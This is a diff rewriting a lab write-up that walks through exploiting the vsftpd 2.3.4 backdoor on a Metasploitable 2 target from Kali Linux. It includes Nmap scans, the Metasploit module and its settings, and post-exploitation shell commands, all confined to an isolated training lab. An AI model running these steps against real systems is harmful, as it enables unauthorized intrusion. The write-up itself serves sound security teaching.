@@ -1,53 +1,175 @@
-Experiment: Simulated Ethical Hacking with Metasploit
+# Experiment 2: Simulated Ethical Hacking with Metasploit
 
-Objective
+## Overview
 
-To perform a safe exploitation of a vulnerable virtual machine using Metasploit and understand the basic ethical hacking procedure.
+This experiment demonstrates a basic ethical hacking process using the **Metasploit Framework** in a controlled virtual lab environment. Kali Linux is used as the attacking machine, while Metasploitable 2 acts as the vulnerable target machine.
 
-Procedure
+The experiment covers network reconnaissance, vulnerability identification, exploitation, and basic post-exploitation activities using a known vulnerable FTP service (vsftpd 2.3.4).
 
-Step 1: Start the Virtual Machines
-Start the Kali Linux and Metasploitable virtual machines and ensure they are connected to the same virtual network.
+## Objective
 
-Step 2: Identify the Target IP Address
-Determine the IP address of the Metasploitable machine using:
+To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.
 
+## Environment and Tools Used
+
+- **Kali Linux** – Attacker machine.
+- **Metasploitable 2** – Vulnerable target machine.
+- **Metasploit Framework** – Exploitation framework.
+- **Nmap** – Network scanning and reconnaissance.
+- **VirtualBox / VMware** – Virtualization platform.
+- **Host-Only Adapter / Internal Network** – Isolated lab networking.
+
+## Methodology
+
+### Step 1: Configure Virtual Machines
+
+1. Install Kali Linux and Metasploitable 2.
+2. Open VirtualBox or VMware.
+3. Configure both virtual machines using a Host-Only Adapter or Internal Network.
+4. Start both virtual machines.
+
+### Step 2: Verify Network Connectivity
+
+Check the IP address of Metasploitable 2.
+
+**On Metasploitable 2:**
+
+```bash
 ifconfig
+```
 
-Step 3: Scan the Target
-Use Nmap from Kali Linux to identify open ports and available services:
+**On Kali Linux:**
 
-nmap -sV <target-ip>
+```bash
+ping <Metasploitable_IP>
+```
 
-Step 4: Launch Metasploit Framework
-Open the Metasploit console in Kali Linux:
+Verify that both machines can communicate with each other.
 
+### Step 3: Perform Reconnaissance
+
+Use Nmap to identify open ports, running services, and operating system details.
+
+```bash
+nmap -sS -sV -O <Metasploitable_IP>
+```
+
+### Step 4: Save Nmap Results
+
+Save the scan results into a text file for documentation.
+
+```bash
+nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
+```
+
+### Step 5: Launch Metasploit
+
+Start the Metasploit Framework from the Kali Linux terminal.
+
+```bash
 msfconsole
+```
 
-Step 5: Search for a Suitable Exploit
-Search the Metasploit database for an exploit corresponding to a vulnerable service on the target:
+### Step 6: Search for the Exploit
 
-search <service/vulnerability>
+Search for the known vsftpd 2.3.4 backdoor vulnerability.
 
-Step 6: Select and Configure the Exploit
-Select the required exploit and configure the target IP address:
+```bash
+search vsftpd
+```
 
-use <exploit>
-set RHOSTS <target-ip>
+### Step 7: Select the Exploit Module
 
-Set the required options and verify the configuration.
+Select the appropriate Metasploit exploit module.
 
-Step 7: Execute the Exploit
-Run the exploit against the authorized Metasploitable virtual machine:
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
 
+### Step 8: Set the Target Host
+
+Configure the IP address of the Metasploitable 2 machine.
+
+```bash
+set RHOST <Metasploitable_IP>
+```
+
+### Step 9: Set the Target Port
+
+Set the FTP service port.
+
+```bash
+set RPORT 21
+```
+
+### Step 10: Execute the Exploit
+
+Run the selected exploit against the authorized test machine.
+
+```bash
 exploit
+```
 
-Step 8: Verify the Result
-Observe the Metasploit output and verify whether a session was successfully established.
+### Step 11: Verify the Shell and System Information
 
-Step 9: Close the Session
-After completing the demonstration, terminate the session and exit Metasploit.
+If the exploitation is successful and a command shell is opened, verify the target system information.
 
-Result
+```bash
+whoami
+uname -a
+ifconfig
+```
 
-The exploitation of the vulnerable virtual machine was performed safely using Metasploit, demonstrating the basic ethical hacking and vulnerability exploitation process.
+### Step 12: Check Processes and Network Services
+
+View the running processes and listening network services.
+
+```bash
+ps aux
+netstat -tulnp
+```
+
+### Step 13: Create and View a Test File
+
+Create a temporary test file to verify basic file operations on the target machine.
+
+```bash
+echo "This is a test file" > /tmp/test.txt
+cat /tmp/test.txt
+```
+
+## Expected Observations
+
+- Successful communication between Kali Linux and Metasploitable 2.
+- Identification of open ports and vulnerable FTP services using Nmap.
+- Detection of the vsftpd 2.3.4 service.
+- Selection and execution of the corresponding Metasploit module.
+- Verification of shell access, if exploitation succeeds.
+- Observation of system information, processes, and network services.
+
+## Result
+
+The target machine was scanned, a known vulnerable FTP service was identified, and a controlled exploitation exercise was performed using the Metasploit Framework in an isolated virtual lab environment.
+
+## Conclusion
+
+This experiment demonstrated the basic stages of ethical hacking, including reconnaissance, vulnerability identification, exploitation, and post-exploitation. Nmap helped identify the vulnerable service, while Metasploit was used to perform the controlled exploitation exercise.
+
+## Ethical Considerations
+
+- Perform exploitation only on authorized test machines.
+- Use Metasploitable 2 as the vulnerable target.
+- Keep the lab isolated from public and production networks.
+- Never attempt exploitation on systems without permission.
+- Use the knowledge gained to understand vulnerabilities and improve system security.
+
+## Skills Learned
+
+- Ethical hacking fundamentals
+- Network reconnaissance
+- Nmap scanning
+- Vulnerability identification
+- Metasploit Framework
+- Exploit module selection
+- Basic post-exploitation
+- Linux command-line operations
